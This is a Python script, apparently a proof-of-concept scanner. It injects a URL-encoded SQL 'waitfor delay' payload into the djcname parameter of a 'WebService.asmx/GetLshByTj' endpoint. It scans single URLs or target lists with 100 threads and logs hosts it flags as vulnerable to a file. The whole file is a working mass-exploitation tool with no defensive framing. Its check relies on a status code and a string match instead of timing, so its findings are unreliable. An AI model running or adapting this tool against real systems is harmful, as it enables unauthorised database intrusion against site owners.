import requests,sys,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """


██╗   ██╗██╗   ██╗██╗  ██╗██╗  ██╗███████╗ ██████╗ ██╗     
╚██╗ ██╔╝╚██╗ ██╔╝╚██╗██╔╝╚██╗██╔╝██╔════╝██╔═══██╗██║     
 ╚████╔╝  ╚████╔╝  ╚███╔╝  ╚███╔╝ ███████╗██║   ██║██║     
  ╚██╔╝    ╚██╔╝   ██╔██╗  ██╔██╗ ╚════██║██║▄▄ ██║██║     
   ██║      ██║   ██╔╝ ██╗██╔╝ ██╗███████║╚██████╔╝███████╗
   ╚═╝      ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝ ╚══▀▀═╝ ╚══════╝                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
                                                           
                                                version: 1.0
"""
    print(banner)
def main():
    banner()
    parser = argparse.ArgumentParser(description='QLBSQL! ')
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    #判断输入的参数是单个还是文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        #多线程
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload_url = "/WebService.asmx/GetLshByTj?djcname=%31%27%3b%77%61%69%74%66%6f%72%20%64%65%6c%61%79%20%27%30%3a%30%3a%33%27%2d%2d%20%2d&redonly=true&tjstr=12"
    url = target+payload_url
    try:
        res = requests.get(url=url,verify=False,timeout=10)
        if res.status_code == 200 and 'version="1.0"' in res.text :
            print(f"[+]该url存在漏洞{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                        fp.write(target+"\n")
                        return True
        else:
            print(f"[-]该url不存在漏洞{target}")
    except :
        print(f"[*]该url存在问题{target}")
        return False

if __name__ == '__main__':
    main()